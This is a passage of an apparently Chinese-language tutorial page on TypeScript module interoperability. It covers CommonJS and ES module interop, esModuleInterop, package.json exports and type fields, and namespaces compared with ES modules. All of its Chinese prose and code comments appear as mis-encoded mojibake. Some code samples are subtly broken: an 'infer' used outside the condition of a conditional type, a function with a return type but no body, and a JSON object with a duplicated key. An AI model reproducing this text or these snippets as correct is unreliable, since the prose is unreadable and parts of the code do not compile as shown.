class="hljs-string">&#x27;./es-module&#x27;</span>).<span class="hljs-property">default</span>.<span class="hljs-property">value</span>; <span class="hljs-comment">// âœ… æ­£ç¡®</span><br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹æœ€ä½³å®è·µ</strong></p><ol><li>ç»Ÿä¸€æ¨¡å—æ ¼å¼ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// tsconfig.json</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;compilerOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;module&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ESNext&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-comment">// è¾“å‡ºESM</span><br>    <span class="hljs-attr">&quot;moduleResolution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Node&quot;</span> <span class="hljs-comment">// æ”¯æŒNodeè§£æè§„åˆ™</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>æ¡ä»¶å¯¼å‡ºï¼ˆpackage.jsonï¼‰ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;exports&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;import&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./dist/esm/index.js&quot;</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// ESMå…¥å£</span><br>    <span class="hljs-attr">&quot;require&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./dist/cjs/index.js&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// CommonJSå…¥å£</span><br>    <span class="hljs-attr">&quot;default&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./dist/cjs/index.js&quot;</span>   <span class="hljs-comment">// å›é€€</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ol start="3"><li>åŒæ ¼å¼å‘å¸ƒï¼š</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">my-package/<br>â”œâ”€â”€ dist/<br>â”‚   â”œâ”€â”€ esm/        // ESæ¨¡å—ç‰ˆæœ¬<br>â”‚   â”‚   â””â”€â”€ index.js<br>â”‚   â””â”€â”€ cjs/        // CommonJSç‰ˆæœ¬<br>â”‚       â””â”€â”€ index.js<br>â”œâ”€â”€ package.json<br></code></pre></td></tr></table></figure><ol start="4"><li>äº’æ“ä½œå°è£…å±‚ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// cjs-compat.ts - CommonJSå°è£…å±‚</span><br><span class="hljs-keyword">import</span> esModule <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./es-module&#x27;</span>;<br><span class="hljs-keyword">export</span> = esModule; <span class="hljs-comment">// è½¬æ¢ä¸ºCommonJSå¯¼å‡º</span><br></code></pre></td></tr></table></figure><p><strong>TypeScript ç¼–è¯‘é€‰é¡¹</strong></p><table><thead><tr><th align="left">é€‰é¡¹</th><th align="left">å€¼</th><th align="left">äº’æ“ä½œå½±å“</th></tr></thead><tbody><tr><td align="left">esModuleInterop</td><td align="left">true (æ¨è)</td><td align="left">ç”Ÿæˆå…¼å®¹ä»£ç ï¼Œå…è®¸é»˜è®¤å¯¼å…¥CommonJSæ¨¡å—</td></tr><tr><td align="left">allowSyntheticDefaultImports</td><td align="left">true</td><td align="left">å…è®¸ç±»å‹ç³»ç»Ÿä¸­çš„é»˜è®¤å¯¼å…¥</td></tr><tr><td align="left">module</td><td align="left">CommonJS&#x2F;Node16</td><td align="left">æ§åˆ¶è¾“å‡ºæ¨¡å—æ ¼å¼</td></tr><tr><td align="left">moduleResolution</td><td align="left">Node16 (æ¨è)</td><td align="left">æ”¯æŒpackage.jsonçš„exportså’Œimportså­—æ®µ</td></tr></tbody></table><p>esModuleInterop å·¥ä½œåŸç†ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// å¼€å¯å‰</span><br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-built_in">exports</span>.<span class="hljs-property">default</span> = fs;<br><br><span class="hljs-comment">// å¼€å¯å</span><br><span class="hljs-keyword">var</span> __importDefault = (<span class="hljs-variable language_">this</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">__importDefault</span>) || <span class="hljs-keyword">function</span> (<span class="hljs-params">mod</span>) &#123;<br>    <span class="hljs-keyword">return</span> (mod &amp;&amp; mod.<span class="hljs-property">__esModule</span>) ? mod : &#123; <span class="hljs-string">&quot;default&quot;</span>: mod &#125;;<br>&#125;;<br><span class="hljs-keyword">var</span> fs_1 = <span class="hljs-title function_">__importDefault</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>));<br><span class="hljs-built_in">exports</span>.<span class="hljs-property">default</span> = fs_1.<span class="hljs-property">default</span>;<br></code></pre></td></tr></table></figure><p><strong>Node.js ç¯å¢ƒäº’æ“ä½œ</strong></p><ol><li>.mjs ä¸ .cjs æ‰©å±•åï¼š</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// ESæ¨¡å— (module.mjs)</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params"></span>) &#123;&#125;<br><br><span class="hljs-comment">// CommonJSå¯¼å…¥ (script.cjs)</span><br><span class="hljs-keyword">const</span> &#123; hello &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./module.mjs&#x27;</span>); <span class="hljs-comment">// âŒ Nodeä¸å…è®¸</span><br><span class="hljs-keyword">const</span> esm = <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./module.mjs&#x27;</span>); <span class="hljs-comment">// âœ… å¿…é¡»ä½¿ç”¨åŠ¨æ€å¯¼å…¥</span><br></code></pre></td></tr></table></figure><ol start="2"><li>package.json type å­—æ®µï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;module&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// æ‰€æœ‰.jsæ–‡ä»¶è§†ä¸ºESæ¨¡å—</span><br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;commonjs&quot;</span> <span class="hljs-comment">// é»˜è®¤å€¼</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ol start="3"><li>æ–‡ä»¶æ‰©å±•åè§„åˆ™ï¼š</li></ol><table><thead><tr><th align="left">æ–‡ä»¶æ‰©å±•å</th><th align="left">æ¨¡å—ç±»å‹</th><th align="left">å¯¼å…¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">.js</td><td align="left">ç”±typeå­—æ®µå†³å®š</td><td align="left">æ ¹æ®typeå­—æ®µå¤„ç†</td></tr><tr><td align="left">.mjs</td><td align="left">ESæ¨¡å—</td><td align="left">åªèƒ½importå¯¼å…¥</td></tr><tr><td align="left">.cjs</td><td align="left">CommonJS</td><td align="left">åªèƒ½requireå¯¼å…¥</td></tr></tbody></table><p><strong>æµè§ˆå™¨ç¯å¢ƒäº’æ“ä½œ</strong></p><ol><li>è„šæœ¬ç±»å‹å£°æ˜ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;!-- åŠ è½½ESæ¨¡å— --&gt;<br>&lt;script type=&quot;module&quot; src=&quot;app.js&quot;&gt;&lt;/script&gt;<br><br>&lt;!-- åŠ è½½CommonJSæ¨¡å—ï¼ˆéœ€æ‰“åŒ…è½¬æ¢ï¼‰ --&gt;<br>&lt;script src=&quot;cjs-bundle.js&quot;&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><ol start="2"><li>åŠ¨æ€å¯¼å…¥å…¼å®¹ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æµè§ˆå™¨ä¸­çš„åŠ¨æ€å¯¼å…¥</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">module</span> === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>  <span class="hljs-comment">// Nodeç¯å¢ƒ</span><br>  <span class="hljs-keyword">const</span> mod = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./cjs-module&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// æµè§ˆå™¨ç¯å¢ƒ</span><br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./es-module.js&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">mod</span> =&gt;</span> &#123;&#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>äº’æ“ä½œç±»å‹å®‰å…¨ç­–ç•¥</strong></p><ol><li>æ¨¡å—æ‰©å……å£°æ˜ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ‰©å……CommonJSæ¨¡å—ç±»å‹</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;fs&#x27;</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">customMethod</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">import</span> fs <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;fs&#x27;</span>;<br>fs.<span class="hljs-title function_">customMethod</span>(); <span class="hljs-comment">// âœ… ç±»å‹å®‰å…¨</span><br></code></pre></td></tr></table></figure><ol start="2"><li>æ¡ä»¶ç±»å‹å¤„ç†ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŒºåˆ†æ¨¡å—ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ModuleType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> &#123; <span class="hljs-attr">__esModule</span>: <span class="hljs-literal">true</span> &#125; ? <br>  &#123; <span class="hljs-attr">default</span>: infer U &#125; : T;<br><br><span class="hljs-keyword">function</span> importCompat&lt;T&gt;(<span class="hljs-attr">module</span>: T): <span class="hljs-title class_">ModuleType</span>&lt;T&gt; &#123;<br>  <span class="hljs-comment">// å®ç°äº’æ“ä½œè½¬æ¢</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>è¿è¡Œæ—¶ç±»å‹å®ˆå«ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ£€æµ‹ESæ¨¡å—</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">isESModule</span>(<span class="hljs-params"><span class="hljs-attr">module</span>: <span class="hljs-built_in">any</span></span>): <span class="hljs-variable language_">module</span> is &#123; <span class="hljs-attr">default</span>: <span class="hljs-built_in">any</span> &#125; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">module</span>.<span class="hljs-property">__esModule</span> || <br>    (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Symbol</span> !== <span class="hljs-string">&#x27;undefined&#x27;</span> &amp;&amp; <br>     <span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toStringTag</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">module</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-4-2-å‘½åç©ºé—´ä¸ç°ä»£æ¨¡å—å¯¹æ¯”"><a href="#1-4-2-å‘½åç©ºé—´ä¸ç°ä»£æ¨¡å—å¯¹æ¯”" class="headerlink" title="1.4.2 å‘½åç©ºé—´ä¸ç°ä»£æ¨¡å—å¯¹æ¯”"></a>1.4.2 å‘½åç©ºé—´ä¸ç°ä»£æ¨¡å—å¯¹æ¯”</h3><p><strong>å‘½åç©ºé—´ï¼ˆNamespacesï¼‰</strong></p><p>æ ¸å¿ƒæ¦‚å¿µï¼šTypeScript æ—©æœŸæä¾›çš„é€»è¾‘åˆ†ç»„æœºåˆ¶ï¼Œç”¨äºç»„ç»‡å…¨å±€ä½œç”¨åŸŸä»£ç </p><p>åŸºæœ¬è¯­æ³•ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å®šä¹‰å‘½åç©ºé—´</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">MyUtils</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params"><span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);<br>  &#125;<br>  <br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Math</span> &#123;<br>    <span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-number">3.14</span>;<br>    <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">circleArea</span>(<span class="hljs-params"><span class="hljs-attr">r</span>: <span class="hljs-built_in">number</span></span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">PI</span> * r * r;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-title class_">MyUtils</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello&quot;</span>);<br><span class="hljs-keyword">const</span> area = <span class="hljs-title class_">MyUtils</span>.<span class="hljs-property">Math</span>.<span class="hljs-title function_">circleArea</span>(<span class="hljs-number">5</span>);<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘ç»“æœï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// è½¬æ¢ä¸ºé—­åŒ…å½¢å¼</span><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">MyUtils</span>;<br>(<span class="hljs-keyword">function</span> (<span class="hljs-params">MyUtils</span>) &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params">message</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);<br>  &#125;<br>  <span class="hljs-title class_">MyUtils</span>.<span class="hljs-property">log</span> = log;<br>  <br>  <span class="hljs-keyword">let</span> <span class="hljs-title class_">Math</span>;<br>  (<span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-built_in">Math</span></span>) &#123;<br>    <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> = <span class="hljs-number">3.14</span>;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">circleArea</span>(<span class="hljs-params">r</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> * r * r;<br>    &#125;<br>    <span class="hljs-title class_">Math</span>.<span class="hljs-property">circleArea</span> = circleArea;<br>  &#125;)(<span class="hljs-title class_">Math</span> = <span class="hljs-title class_">MyUtils</span>.<span class="hljs-property">Math</span> || (<span class="hljs-title class_">MyUtils</span>.<span class="hljs-property">Math</span> = &#123;&#125;));<br>&#125;)(<span class="hljs-title class_">MyUtils</span> || (<span class="hljs-title class_">MyUtils</span> = &#123;&#125;));<br></code></pre></td></tr></table></figure><p><strong>ç°ä»£æ¨¡å—ï¼ˆES Modulesï¼‰</strong></p><p>æ ¸å¿ƒæ¦‚å¿µï¼šES6 æ ‡å‡†å¼•å…¥çš„æ–‡ä»¶çº§ä½œç”¨åŸŸéš”ç¦»æœºåˆ¶</p><p>åŸºæœ¬è¯­æ³•ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// math.ts</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-number">3.14</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">circleArea</span>(<span class="hljs-params"><span class="hljs-attr">r</span>: <span class="hljs-built_in">number</span></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">PI</span> * r * r;<br>&#125;<br><br><span class="hljs-comment">// logger.ts</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params"><span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);<br>&#125;<br><br><span class="hljs-comment">// app.ts</span><br><span class="hljs-keyword">import</span> &#123; log &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./logger&#x27;</span>;<br><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">MathUtils</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./math&#x27;</span>;<br><br><span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Calculating area&quot;</span>);<br><span class="hljs-keyword">const</span> area = <span class="hljs-title class_">MathUtils</span>.<span class="hljs-title function_">circleArea</span>(<span class="hljs-number">5</span>);<br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒå·®å¼‚å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">å‘½åç©ºé—´</th><th align="left">ç°ä»£æ¨¡å—</th></tr></thead><tbody><tr><td align="left">ä½œç”¨åŸŸ</td><td align="left">å…¨å±€&#x2F;æ–‡ä»¶å†…</td><td align="left">æ–‡ä»¶çº§ä½œç”¨åŸŸ</td></tr><tr><td align="left">ä¾èµ–ç®¡ç†</td><td align="left">æ‰‹åŠ¨æ’åº<code>&lt;script&gt;</code>æ ‡ç­¾</td><td align="left">è‡ªåŠ¨ä¾èµ–è§£æï¼ˆimport&#x2F;exportï¼‰</td></tr><tr><td align="left">ä»£ç ç»„ç»‡</td><td align="left">é€»è¾‘åˆ†ç»„</td><td align="left">ç‰©ç†æ–‡ä»¶åˆ†ç»„</td></tr><tr><td align="left">ä»£ç åˆ†å‰²</td><td align="left">ä¸æ”¯æŒ</td><td align="left">åŸç”Ÿæ”¯æŒï¼ˆåŠ¨æ€å¯¼å…¥ï¼‰</td></tr><tr><td align="left">æ‘‡æ ‘ä¼˜åŒ–</td><td align="left">ä¸æ”¯æŒ</td><td align="left">åŸç”Ÿæ”¯æŒï¼ˆTree Shakingï¼‰</td></tr><tr><td align="left">è¿è¡Œæ—¶æ€§èƒ½</td><td align="left">æ‰€æœ‰ä»£ç ç«‹å³åŠ è½½</td><td align="left">æŒ‰éœ€åŠ è½½</td></tr><tr><td align="left">ç±»å‹å£°æ˜</td><td align="left">é€šè¿‡&#x2F;&#x2F;&#x2F; <code>&lt;reference&gt;</code>æŒ‡ä»¤</td><td align="left">è‡ªåŠ¨è§£æ.d.tsæ–‡ä»¶</td></tr><tr><td align="left">å…¨å±€æ±¡æŸ“</td><td align="left">å¯èƒ½æ±¡æŸ“å…¨å±€å‘½åç©ºé—´</td><td align="left">æ— å…¨å±€æ±¡æŸ“</td></tr></tbody></table><p><strong>ä½¿ç”¨åœºæ™¯æŒ‡å—</strong></p><p>å‘½åç©ºé—´é€‚ç”¨åœºæ™¯ï¼š</p><ol><li>æµè§ˆå™¨ç¯å¢ƒä¸‹çš„æ—§é¡¹ç›®ç»´æŠ¤</li><li>éœ€è¦å…¨å±€å¯è®¿é—®çš„åº“ç±»å‹å£°æ˜ï¼ˆå¦‚window.myLibï¼‰</li><li>å°†å¤§å‹åº“æ‹†åˆ†ä¸ºå¤šä¸ªæ–‡ä»¶ä½†ä»éœ€å…±äº«ä½œç”¨åŸŸ</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å¤šæ–‡ä»¶å‘½åç©ºé—´</span><br><span class="hljs-comment">// Validation.ts</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Validation</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Validator</span> &#123;<br>    <span class="hljs-title function_">isValid</span>(<span class="hljs-attr">s</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">boolean</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// LettersOnlyValidator.ts</span><br><span class="hljs-comment">/// &lt;reference path=&quot;Validation.ts&quot; /&gt;</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Validation</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LettersOnlyValidator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Validator</span> &#123;<br>    <span class="hljs-title function_">isValid</span>(<span class="hljs-params"><span class="hljs-attr">s</span>: <span class="hljs-built_in">string</span></span>) &#123; <span class="hljs-comment">/*...*/</span> &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç°ä»£æ¨¡å—é€‚ç”¨åœºæ™¯ï¼š</p><ol><li>æ–°é¡¹ç›®å¼€å‘</li><li>éœ€è¦ä»£ç åˆ†å‰²çš„åº”ç”¨</li><li>ç»„ä»¶åŒ–æ¶æ„ï¼ˆReact&#x2F;Vueï¼‰</li><li>Node.js æœåŠ¡ç«¯åº”ç”¨</li><li>éœ€è¦ Tree Shaking ä¼˜åŒ–çš„åº“</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç°ä»£æ¨¡å—åŒ–ç»„ä»¶</span><br><span class="hljs-comment">// Button.tsx</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params">&#123; text &#125;: &#123; text: <span class="hljs-built_in">string</span> &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>&#123;text&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// App.tsx</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Button</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./Button&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">text</span>=<span class="hljs-string">&quot;Click&quot;</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ··åˆä½¿ç”¨æ¨¡å¼</strong></p><p>åœºæ™¯ï¼šæ¨¡å—æ‰©å±•å‘½åç©ºé—´</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// shapes.ts - å‘½åç©ºé—´å®šä¹‰</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Shapes</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span> &#123; <span class="hljs-comment">/*...*/</span> &#125;<br>&#125;<br><br><span class="hljs-comment">// extensions.ts - æ¨¡å—æ‰©å±•å‘½åç©ºé—´</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./shapes&#x27;</span>; <span class="hljs-comment">// ç¡®ä¿å‘½åç©ºé—´å­˜åœ¨</span><br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">global</span> &#123;<br>  <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Shapes</span> &#123;<br>    <span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Triangle</span> &#123; <span class="hljs-comment">/*...*/</span> &#125; <span class="hljs-comment">// æ‰©å±•å‘½åç©ºé—´</span><br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> triangle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shapes</span>.<span class="hljs-title 